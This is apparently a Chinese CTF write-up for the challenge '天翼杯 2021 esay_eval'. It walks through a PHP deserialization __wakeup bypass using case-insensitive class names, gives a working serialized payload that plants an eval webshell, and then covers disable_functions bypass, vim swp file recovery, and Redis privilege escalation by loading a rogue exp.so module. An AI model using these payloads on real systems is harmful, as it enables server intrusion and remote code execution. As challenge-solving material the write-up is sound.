---
title: bypass
date: 2025-01-09 10:43:20
categories: CTF
tags: ctf
crated: 2026-01-20T15:50
updated: 2026-01-20T15:39
---

# 简介
在长城杯上偶遇未知bypass，拼劲全力无法战胜，特此来修炼

## [[天翼杯 2021]esay_eval](https://www.nssctf.cn/problem/364)
```php
<?php
class A{
    public $code = "";
    function __call($method,$args){
        eval($this->code);
        
    }
    function __wakeup(){
        $this->code = "";
    }
}

class B{
    function __destruct(){
        echo $this->a->a();
    }
}
if(isset($_REQUEST['poc'])){
    preg_match_all('/"[BA]":(.*?):/s',$_REQUEST['poc'],$ret);
    if (isset($ret[1])) {
        foreach ($ret[1] as $i) {
            if(intval($i)!==1){
                exit("you want to bypass wakeup ? no !");
            }
        }
        unserialize($_REQUEST['poc']);    
    }


}else{
    highlight_file(__FILE__);
} 
```
首先会对传入的参数做一个正则匹配，匹配A类和B类名字后面的数目，要求必须为1，而我们要绕过
wakeup需要大于1，这里利用php对类名大小写不敏感的特性去绕过，payload

so easy 的一个反序列化,要注意一个点,利用php对类名大小写不敏感的特性去绕过题目中的正则表达式，在构造payload的时候，将类名换为a,b；

```php
<?php
class a{

    public $code = "";
    function __construct(){
//$this->code="phpinfo();";
    $this->code="eval(\$_GET['pass']);";//写个🐎进去
}

}
class b{
    function __construct(){
        $this->a=new a();
    }
}
echo serialize(new b());
# 最后改一下b类属性的数量,让其不为1,触发wakeup魔术方法
#O:1:"b":1:{s:1:"a";O:1:"a":1:{s:4:"code";s:10:"phpinfo();";}}
#改成O:1:"b":2:{s:1:"a";O:1:"a":1:{s:4:"code";s:10:"phpinfo();";}}

O:1:"b":2:{s:1:"a";O:1:"a":1:{s:4:"code";s:21:"eval($_POST['pass']);";}}

```
蚁剑连接
![](https://gitee.com/fogpost/photo/raw/master/202501091121732.png)
![](https://gitee.com/fogpost/photo/raw/master/202501091120750.png)
发现权限不足，尝试使用蚁剑的插件，暴力绕过
disable_functions,Antsword插件
![](https://gitee.com/fogpost/photo/raw/master/202501091213124.png)

同时发现这个是个swp文件，这是vim缓存泄露的文件，尝试恢复一下
>在开发人员使用 vim 编辑器 编辑文本时，系统会自动生成一个备份文件，当编辑完成后，保存时，原文件会更新，备份文件会被自动删除。  
但是，当编辑操作意外终止时，这个备份文件就会保留，如果多次编辑文件都意外退出，备份文件并不会覆盖，而是以 swp、swo、swn 等其他格式，依次备份。

利用vim来恢复 vim -r XXXX.php.swp
![](https://gitee.com/fogpost/photo/raw/master/202501091224047.png)
在这里发现了REDIS的配置文件，尝试连接

这里要下载exp.so文件，并进行利用，简单解释一下exp.so文件
>Redis 中的 exp.so 文件通常被用作 Redis 提权的一种方式。这个文件是一个 Redis 模块，它可以在 Redis 服务器中执行任意代码。  
Redis 模块是一种可插拔的扩展，它允许用户在 Redis 服务器中添加新的功能。exp.so 文件是一个 Redis 模块，它提供了一些命令和功能，可以让攻击者在 Redis 服务器中执行任意代码，从而获得服务器的控制权。  
在 Redis 提权攻击中，攻击者通常会利用 Redis 的漏洞或者弱密码，获取 Redis 服务器的访问权限。一旦攻击者获得了访问权限，他们就可以上传 exp.so 文件到 Redis 服务器中，并使用 Redis 的 module load 命令加载这个文件。这个文件会在 Redis 服务器中执行任意代码，从而让攻击者获得服务器的控制权

EXP.SO:https://github.com/Dliv3/redis-rogue-server

然后用redis提权
![](https://gitee.com/fogpost/photo/raw/master/202501091255627.png)
![](https://gitee.com/fogpost/photo/raw/master/202501091256738.png)
随便选择一个，执行命令，利用module load 命令加载这个文件，然后才能进行RCE，所以在虚拟命令行输入MODULE LOAD /var/www/html/exp.so
然后我们就可以进行命令执行了，即可查看flag
![](https://gitee.com/fogpost/photo/raw/master/202501091257489.png)